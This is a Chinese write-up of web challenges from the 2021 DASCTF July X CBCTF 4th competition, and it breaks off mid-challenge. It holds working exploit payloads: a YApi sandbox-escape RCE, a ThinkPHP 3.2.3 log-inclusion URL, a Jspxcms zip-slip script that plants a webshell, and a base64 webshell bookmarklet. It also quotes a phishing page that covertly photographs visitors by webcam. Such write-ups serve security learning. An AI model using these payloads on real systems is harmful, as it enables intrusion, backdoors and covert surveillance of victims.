# 2021 DASCTF July X CBCTF 4th 部分WriteUp
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 引言
> **2021DASCTF 实战精英夏令营预热赛暨 DASCTF July X CBCTF 4th**
>
> 
又是摸鱼的一个周末，不过这个比赛和 巅峰极客网络安全技能挑战赛 冲突了，那个比赛写了点 wp 在下面这篇。
[CTF | 2021 巅峰极客网络安全技能挑战赛
WriteUp](https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/)
于是第一天都在打那个比赛，这边就第二天下午随便看了看。
不过看了几题 web 发现有不少是复现漏洞或者自己挖洞的题，寻思着还有点味道，赛后又来复现了一下。
主要看的是 Web 和 Misc 题目，这篇大部分是边做边写的，写得还是挺详细的吧，当然也少不了走弯路的地方。
大师傅们随便看看就好了（
## Web
###  ezrce
> 你真的会 nodejs 吗？
参考 [yapi远程代码执行漏洞复现（部署+复现）](https://zhuanlan.zhihu.com/p/388742545)
先注册个账号，然后添加个 高级 Mock 脚本即可。
    const sandbox = this
    const ObjectConstructor = this.constructor
    const FunctionConstructor = ObjectConstructor.constructor
    const test = FunctionConstructor('return process')
    const process = test()
    mockJson = process.mainModule.require("child_process").execSync("whoami && ps -ef && ls -al /&& cat /ffffffflllllaggggg").toString()
再点击这个预览的地址即可。
###  cat flag
> 简简单单cat flag
>
> Hint: 管理员曾访问过flag
> **escapeshellarg** — 把字符串转码为可以在 shell 命令里使用的参数
>
> **功能** ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入
> shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)
>
> **定义** ：`string escapeshellarg ( string $arg )`
倒是这个单独用貌似不存在绕过啥的（bushi
>
> [谈谈escapeshellarg参数绕过和注入的问题](http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/)
>
>
> [浅谈escapeshellarg逃逸与参数注入](https://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/)
>
> 一方面是 先 escapeshellarg 再 escapeshellcmd 处理的话存在参数注入，另一方面主要是通过调用的命令（如 tar find
> wget curl 之类）自带的参数来实现绕过或者执行其他的命令。
先读几个文件看看。
`/etc/passwd`
    root:x:0:0:root:/root:/bin/ash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/mail:/sbin/nologin
    news:x:9:13:news:/usr/lib/news:/sbin/nologin
    uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    man:x:13:15:man:/usr/man:/sbin/nologin
    postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
    cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
    ftp:x:21:21::/var/lib/ftp:/sbin/nologin
    sshd:x:22:22:sshd:/dev/null:/sbin/nologin
    at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
    squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
    xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
    games:x:35:35:games:/usr/games:/sbin/nologin
    cyrus:x:85:12::/usr/cyrus:/sbin/nologin
    vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
    ntp:x:123:123:NTP:/var/empty:/sbin/nologin
    smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
    guest:x:405:100:guest:/dev/null:/sbin/nologin
    nobody:x:65534:65534:nobody:/:/sbin/nologin
    www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
    utmp:x:100:406:utmp:/home/utmp:/bin/false
    nginx:x:101:101:nginx:/var/lib/nginx:/sbin/nologin
系统是 Alpine Linux, ash
    NAME="Alpine Linux"
    ID=alpine
    VERSION_ID=3.13.0
    PRETTY_NAME="Alpine Linux v3.13"
    HOME_URL="https://alpinelinux.org/"
    BUG_REPORT_URL="https://bugs.alpinelinux.org/"
环境变量
    PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgiUSER=www-dataHOSTNAME=bd65ff0cb21ePHP_INI_DIR=/usr/local/etc/phpSHLVL=2HOME=/home/www-dataPHP_LDFLAGS=-Wl,-O1 -piePHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_VERSION=7.3.26GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5DPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_ASC_URL=https://www.php.net/distributions/php-7.3.26.tar.xz.ascPHP_URL=https://www.php.net/distributions/php-7.3.26.tar.xzPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPHPIZE_DEPS=autoconf         dpkg-dev dpkg         file         g++         gcc         libc-dev         make         pkgconf         re2cPWD=/var/www/htmlPHP_SHA256=d93052f4cb2882090b6a37fd1e0c764be1605a2461152b7f6b8f04fa48875208FLAG=not_flag
`FLAG=not_flag`，草！
根据提示，寻思着读 nginx log
    127.0.0.1 - - [11/Jul/2020:00:00:00 +0000] "GET /this_is_final_flag_e2a457126032b42d.php HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
    192.168.122.180 - - [31/Jul/2021:20:16:06 +0000] "GET / HTTP/1.1" 200 1855 "-" "python-requests/2.25.1"
    192.168.122.180 - - [31/Jul/2021:20:16:09 +0000] "GET / HTTP/1.1" 200 1855 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
    192.168.122.180 - - [31/Jul/2021:20:16:26 +0000] "GET /favicon.ico HTTP/1.1" 200 1855 "http://9f6ec27d-77be-4de4-9373-f93a8bd50480.node4.buuoj.cn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
    ...
所以文件是 `this_is_final_flag_e2a457126032b42d.php`，不过包含了 `flag`。
参考 
可以加个非 ASCII 码字符绕过 `escapeshellarg`，测试发现 `%80` 及以上都行。
###  easythinkphp
ThinkPHP V3.2.3
直接现成工具一把梭
    http://xxxxxxxxxx/?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/21_08_01.log
原理可参考 [炒冷饭之ThinkPHP3.2.X
RCE漏洞分析](https://www.cnblogs.com/sevck/p/15012267.html)
大概就是先写个带有一句话木马的报错语句到日志里，然后文件包含来执行命令。
另外还有其他师傅说其实可以直接文件包含来读 `/flag`.
    m=Home&c=Index&a=index&value[_filename]=/flag
###  jspxcms
后台
默认登录信息 admin / 空
Jspxcms v9.5.1
参考
[复现jspxcms解压getshell漏洞](https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/)
[记一次由追踪溯源发现的“不安全解压getshell”](https://www.anquanke.com/post/id/188788)
unzip 方法未对 ZIP 压缩包里的文件名进行参数校验，就进行文件的写入，构造带有 `../` 的文件名就能构成目录穿越漏洞。
首先基于冰蝎马生成 war 包。
    jar cvf shell.war shell.jsp
然后用脚本把 war 包压缩一下。
    import zipfile
    z = zipfile.ZipFile('miao.zip', 'w', zipfile.ZIP_DEFLATED)
    with open('shell.war','rb') as f:
        temp=f.read()
    z.writestr('../../../shell.war',temp)  #shell.war为上一步生产的后门war包
    z.close()
通过 上传文件 上传压缩包，然后 zip解压 部署上去。
冰蝎成功连上
可以看到本来上传的目录是 `uploads/1/`，通过目录穿越解压到了上级的 `tomcat/webapps` 目录下了。
当然这里也可以参考 [雪姐姐的办法](http://www.snowywar.top/?p=2424#wznav_1)，直接新建个页面，通过
JavaScript 写入个简单的调试页面，直接在浏览器里执行命令、上传文件。
新建个书签，然后直接在 shell 的页面加载书签。
    javascript:{window.localStorage.embed=window.atob("ZG9jdW1lbnQud3JpdGUoIjxwPiIpOw0KdmFyIGh0bWwgPSAiPGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSdjbWQuanNwJz5cDQo8aW5wdXQgbmFtZT0nYycgdHlwZT10ZXh0PjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz5cDQo8L2Zvcm0+PGhyPlwNCjxmb3JtIGFjdGlvbj0nY21kLmpzcCcgbWV0aG9kPXBvc3Q+XA0KVXBsb2FkIGRpcjogPGlucHV0IG5hbWU9J2EnIHR5cGU9dGV4dCB2YWx1ZT0nLic+PGJyPlwNClNlbGVjdCBhIGZpbGUgdG8gdXBsb2FkOiA8aW5wdXQgbmFtZT0nbicgdHlwZT0nZmlsZScgaWQ9J2YnPlwNCjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2InIGlkPSdiJz5cDQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz5cDQo8L2Zvcm0+PGhyPiI7DQp2YXIgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQpkaXYuaW5uZXJIVE1MID0gaHRtbDsNCmRvY3VtZW50LmJvZHkuaW5zZXJ0QmVmb3JlKGRpdiwgZG9jdW1lbnQuYm9keS5maXJzdENoaWxkKTsNCg0KdmFyIGhhbmRsZUZpbGVTZWxlY3QgPSBmdW5jdGlvbihldnQpIHsNCiAgICB2YXIgZmlsZXMgPSBldnQudGFyZ2V0LmZpbGVzOw0KICAgIHZhciBmaWxlID0gZmlsZXNbMF07DQoNCiAgICBpZiAoZmlsZXMgJiYgZmlsZSkgew0KICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCg0KICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24ocmVhZGVyRXZ0KSB7DQogICAgICAgICAgICB2YXIgYmluYXJ5U3RyaW5nID0gcmVhZGVyRXZ0LnRhcmdldC5yZXN1bHQ7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYicpLnZhbHVlID0gYnRvYShiaW5hcnlTdHJpbmcpOw0KICAgICAgICB9Ow0KDQogICAgICAgIHJlYWRlci5yZWFkQXNCaW5hcnlTdHJpbmcoZmlsZSk7DQogICAgfQ0KfTsNCmlmICh3aW5kb3cuRmlsZSAmJiB3aW5kb3cuRmlsZVJlYWRlciAmJiB3aW5kb3cuRmlsZUxpc3QgJiYgd2luZG93LkJsb2IpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGhhbmRsZUZpbGVTZWxlY3QsIGZhbHNlKTsNCn0gZWxzZSB7DQogICAgYWxlcnQoJ1RoZSBGaWxlIEFQSXMgYXJlIG5vdCBmdWxseSBzdXBwb3J0ZWQgaW4gdGhpcyBicm93c2VyLicpOw0KfQ==");eval(window.localStorage.embed);};void(0);
不过这个 shell 估计是个简单的小马，不带加密的，文件名是 `cmd.jsp`，执行命令的密码 `c`。需要的话可以自己改一下。
###  jj’s camera
> jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点
>
> Hint: 网上能搜到源码，仅修改了前端ui，注意服务器的响应
是个会自动抓拍然后上传后端并 302 跳转到任意 url 的网站。
根据 /sc.php?id=miao&url= 以及页面上的代码
_（可能是由于安全客平台的 WAF，这里怎么都保存提交不来，排查了老半天最后才发现问题出在这里。_
_最后么得办法只有把 html 里所有的 script 标签改成了 stcript，大家看看就好（  
_
（安全客注：WAF已经做出调整，力求不对文章正文造成干扰，正在持续优化中~）
        等待跳转...
         -->
            $(document).ready(function () {
                //粒子背景特效
                $('body').particleground({
                    dotColor: '#5cbdaa',
                    lineColor: '#5cbdaa'
                });
            });
        window.addEventListener("DOMContentLoaded", function () {
            var canvas = document.getElementById('canvas');
            var context = canvas.getContext('2d');
            var video = document.getElementById('video');
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({video: true}).then(function (stream) {
                    video.srcObject = stream;
                    video.play();
                    setTimeout(function () {
                        context.drawImage(video, 0, 0, 480, 640);
                    }, 1000);
                    setTimeout(function () {
                        var img = canvas.toDataURL('image/png');
                        document.getElementById('result').value = img;
                        document.getElementById('gopo').submit();
                    }, 1300);
                }, function () {
                    alert("hacked by jj");
                });
            }
        }, false);
直接上 GitHub 上一搜 `qbl.php`